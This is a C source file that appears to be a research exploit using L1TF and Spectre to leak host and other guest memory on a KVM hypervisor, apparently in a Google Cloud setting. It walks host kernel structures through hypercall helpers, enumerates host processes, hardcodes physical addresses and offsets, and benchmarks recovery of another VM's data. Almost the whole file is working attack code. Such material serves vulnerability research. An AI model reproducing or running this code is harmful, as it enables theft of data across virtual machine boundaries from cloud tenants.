#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"
#include "timing.h"

void leak_and_print(uintptr_t base, uintptr_t pa, int nr_bytes)
{
	char *data = l1tf_leak(base, pa, nr_bytes);

	for (int i = 0; i < nr_bytes; i++) {
		printf("%02x ", (uint8_t)data[i]);
	}
	printf("\n");
	for (int i = 0; i < nr_bytes; i++) {
		printf("%c", isprint(data[i]) ? data[i] : '_');
	}
	printf("\n");

	free(data);
}

#define STR(a) STRSTR(a)
#define STRSTR(a) #a
#define dump(x) printf("%20s = %16lx\n", STR(x), x)

void get_feeling_for_kernel_kvm_data_structures(void)
{
	uintptr_t direct_map = hc_direct_map();
	dump(direct_map);
	uintptr_t base = hc_phys_map_base();
	dump(base);
	uintptr_t base_pa = base - direct_map;
	dump(base_pa);
	printf("\n");

	uintptr_t kvm_apic_map = base - 0x218;
	dump(kvm_apic_map);
	for (int off = 0; off < 0x20; off += 0x10) {
		printf("kvm_apic_map+%3x = %16lx %16lx\n", off, hc_read_va(kvm_apic_map+off), hc_read_va(kvm_apic_map+off+8));
	}
	printf("kvm_apic_map/xapic_cluster_map =  0\n");
	for (int off = 0x210; off < 0x230; off += 0x10) {
		printf("kvm_apic_map+%3x = %16lx %16lx\n", off, hc_read_va(kvm_apic_map+off), hc_read_va(kvm_apic_map+off));
	}
	printf("\n");

	uintptr_t kvm_lapic[2];
	for (int i = 0; i < 2; i++) {
		kvm_lapic[i] = hc_read_va(base + i*8); // kvm_apic_map's phys_map[i]
		dump(kvm_lapic[i]);
		for (int off = 0; off < 0x100; off += 0x10) {
			printf("kvm_lapic[%d]+%3x = %16lx %16lx\n", i, off, hc_read_va(kvm_lapic[i]+off), hc_read_va(kvm_lapic[i]+off+8));
		}
		printf("\n");
	}

	uintptr_t kvm_vcpu = hc_read_va(kvm_lapic[0]+0x90); // kvm_lapic's vcpu
	dump(kvm_vcpu);
	for (int off = 0; off < 0x90; off += 0x10) {
		printf("kvm_vcpu+%3x = %16lx %16lx\n", off, hc_read_va(kvm_vcpu+off), hc_read_va(kvm_vcpu+off));
	}
	printf("\n");

	uintptr_t pid = hc_read_va(kvm_vcpu+0x78); // kvm_vcpu's pid
	dump(pid);
	for (int off = 0; off < 0x40; off += 0x10) {
		printf("pid+%3x = %16lx %16lx\n", off, hc_read_va(pid+off), hc_read_va(pid+off));
	}
	printf("\n");

	uintptr_t task_struct = hc_read_va(pid+0x20) - 0xa40; // pid's tasks[0], pointing to task_struct's pid_links[0]
	dump(task_struct);
	for (int off = 0; off < 0x80; off += 0x10) {
		printf("task_struct+%3x = %16lx %16lx\n", off, hc_read_va(task_struct+off), hc_read_va(task_struct+off));
	}
	printf("...\n");
	for (int off = 0x900-0x40; off < 0x900+0x40; off += 0x10) {
		printf("task_struct+%3x = %16lx %16lx\n", off, hc_read_va(task_struct+off), hc_read_va(task_struct+off));
	}
	printf("...\n");
	for (int off = 0x9d0-0x20; off < 0x9d0+0x20; off += 0x10) {
		printf("task_struct+%3x = %16lx %16lx\n", off, hc_read_va(task_struct+off), hc_read_va(task_struct+off));
	}
	printf("...\n");
	for (int off = 0xbf0-0x40; off < 0xbf0+0x40; off += 0x10) {
		printf("task_struct+%3x = %16lx %16lx\n", off, hc_read_va(task_struct+off), hc_read_va(task_struct+off));
	}
	printf("\n");

	// Don't start with our own thread, as it may not be the thread group's
	// leader, and hence not be itself linked into the task-list.
	task_struct = hc_read_va(task_struct + 0x908) - 0x900; // task_struct's tasks.prev

	int nr_processes = 0;
	uintptr_t start = task_struct;
	do {
		int pidd = (int)hc_read_va(task_struct + 0x9d0); // task_struct's pid
		int tgid = (int)hc_read_va(task_struct + 0x9d4); // task_struct's tgid
		char comm[16];
		*(uint64_t *)comm = hc_read_va(task_struct + 0xbf0);
		*(uint64_t *)&comm[8] = hc_read_va(task_struct + 0xbf0 + 8);
		printf("task_struct: %16lx tgid: %3d, pid: %3d comm: %s\n", task_struct, tgid, pidd, comm);

		nr_processes++;
		task_struct = hc_read_va(task_struct + 0x900) - 0x900; // task_struct's tasks.next
	} while (task_struct != start);
	printf("nr_processes: %d\n", nr_processes);
}

// rain-vm-gce's data at pa 0x8a6de5e00+0x100
char secret[] = {
	0x12, 0x01, 0x00, 0x03, 0x09, 0x00, 0x03, 0x09, 0x6b, 0x1d, 0x05, 0x03, 0x06, 0x02, 0x0b, 0x0f,
	0x01, 0x01, 0x09, 0x02, 0x1f, 0x00, 0x01, 0x01, 0x00, (char)0xe0, 0x00, 0x09, 0x04, 0x00, 0x00, 0x01,
	0x09, 0x00, 0x00, 0x00, 0x07, 0x05, (char)0x81, 0x03, 0x04, 0x00, 0x0c, 0x06, 0x30, 0x00, 0x00, 0x02,
	0x00, (char)0x90, 0x1a, 0x00, 0x74, 0x62, 0x70, 0x66, 0x5f, 0x70, 0x72, 0x6f, 0x67, 0x5f, 0x36, 0x64,
};

void initial_secret_recovery(uintptr_t base)
{
	uintptr_t leak_pa = 0x8a6de5e00 + 0x100;
	half_spectre_start(base, leak_pa);
	l1tf_do_leak(leak_pa, 0x10);
	half_spectre_stop();
}

void display_data(char *data)
{
	for (int i = 0; i < 4; i++)
		printf("%16lx %16lx\n", *(uint64_t *)(data+i*0x10), *(uint64_t *)(data+i*0x10+8));
}

int check_correctness(char *data)
{
	const int verbose = 2;

	if (verbose >= 2) display_data(data);

	int errors = 0;
	int correct_bytes = 0;
	for (int i = 0; i < 64; i++) {
		if (data[i] == secret[i])
			correct_bytes++;
		else
			errors++;
	}
	int correct_nibbles = 0;
	for (int i = 0; i < 64; i++) {
		correct_nibbles += (data[i] & 0x0f) == (secret[i] & 0x0f);
		correct_nibbles += (data[i] & 0xf0) == (secret[i] & 0xf0);
	}
	int correct_bits = 0;
	for (int i = 0; i < 64; i++)
		for (int b = 0; b < 8; b++)
			correct_bits += (data[i] & (1 << b)) == (secret[i] & (1 << b));
	if (verbose) printf("all:            %2d / %2d bytes,  %3d / %2d nibbles,  %3d / %3d bits\n", correct_bytes, 64, correct_nibbles, 2*64, correct_bits, 8*64);

	correct_bytes = 0;
	int nonzero_bytes = 0;
	for (int i = 0; i < 64; i++) {
		if (secret[i] != 0) {
			nonzero_bytes++;
			correct_bytes += data[i] == secret[i];
		}
	}
	correct_nibbles = 0;
	for (int i = 0; i < 64; i++) {
		if (secret[i] != 0) {
			correct_nibbles += (data[i] & 0x0f) == (secret[i] & 0x0f);
			correct_nibbles += (data[i] & 0xf0) == (secret[i] & 0xf0);
		}
	}
	correct_bits = 0;
	for (int i = 0; i < 64; i++)
		if (secret[i] != 0)
			for (int b = 0; b < 8; b++)
				correct_bits += (data[i] & (1 << b)) == (secret[i] & (1 << b));
	if (verbose) printf("non-zero bytes: %2d / %2d bytes,  %3d / %2d nibbles,  %3d / %3d bits\n", correct_bytes, nonzero_bytes, correct_nibbles, 2*nonzero_bytes, correct_bits, 8*nonzero_bytes);

	return errors;
}

void benchmark_leakage_primitive(uintptr_t base)
{
	char *data;
	int errors;
	uint64_t t0;
	double time;
	uintptr_t leak_pa = 0x8a6de5e00 + 0x100;

	display_data(secret);
	for (int i = 0; i < 3; i++) {
		t0 = clock_read();
		data = thijs_l1tf_leak(base, leak_pa + 0x40, 0x40);
		time = (clock_read()-t0)/1000000000.0;
		errors = check_correctness(data);
		free(data);
		printf("time = %8.1f | errors = %3d\n", time, errors);
	}
}

int main(void)
{
	srand(time(0));
	set_cpu_affinity(CPU);
	l1tf_init();

	// void *p = l1tf_spawn_leak_page();
	// // uintptr_t pa = l1tf_find_page_pa(p);
	// uintptr_t pa = 0x403b765000; // gce?
	// printf("l1tf_find_page_pa --> %lx\n", pa);
	// l1tf_test(p, pa, 1000000);

	// uintptr_t base = l1tf_find_base();
	uintptr_t base = 0x88d43f218;
	// printf("l1tf_find_base --> %lx\n", base);
	// l1tf_test_base(base, 100000);

	// test_half_spectre(p, pa, base);

	// benchmark_leakage_primitive(base);

	uintptr_t direct_map = 0xffff934040000000;


	// #define N 64
	// for (int i = 0; i < N/8; i++)
	// 	*((uint64_t *)p + i) = 0x0123456789abcdef;
	// half_spectre_start(base, pa);
	// l1tf_do_leak(pa, N);
	// half_spectre_stop();

	// spectre_touch_base_start();
	// l1tf_do_leak(base, 0x10);
	// spectre_touch_base_stop();

	// @base: 00 5e de e6 48 93 ff ff 00 5d de e6 48 93 ff ff
	// phys_map[0] = ffff9348e6de5e00 = 0xffff9348c | 0x26de5e00
	// phys_map[1] = ffff9348e6de5d00 = 0xffff9348c | 0x26de5d00
	// base = 0x88d43f218 = 0x88 | 0x0d43f218

	// Assuming ffff9348e6de5d00 <-> 0x8a6de5d00, i.e. page_offset_base = 0xffff934040000000
	// *phys_map[0] = ffffffff84615070
	// *phys_map[1] = ffffffff84615f70

	// Continously leaking 16 bytes from physcial address 0x88d441200:
	// [sibling] starting half_spectre with idx = 3fd
	// fe 28 8e 76 82 97 c9 11 ae fd db c1 ee d7 9f 1a 
	// fe 28 8e 76 82 97 c9 11 ae fd db c1 ee d7 9f 1a


	// for (uintptr_t high = 0x88; high >= 0x80; high--) {
	// 	uintptr_t pa_target = (high << 28) | 0x26de5e00;
	// 	half_spectre_start(base, pa_target);
	// 	l1tf_do_leak(pa_target, 0x10);
	// 	half_spectre_stop();

	// 	pa_target = (high << 28) | 0x26de5d00;
	// 	half_spectre_start(base, pa_target);
	// 	l1tf_do_leak(pa_target, 0x10);
	// 	half_spectre_stop();

	// }


	// uintptr_t direct_map = 0xffff934040000000;

	// uintptr_t pa_target = 0xffffffff84615f70 - direct_map; // == 0x6cbf44615f70 == 108.7TB...
	// half_spectre_start(base, pa_target);
	// l1tf_do_leak(pa_target, 0x18);
	// half_spectre_stop();



	return 0;
}
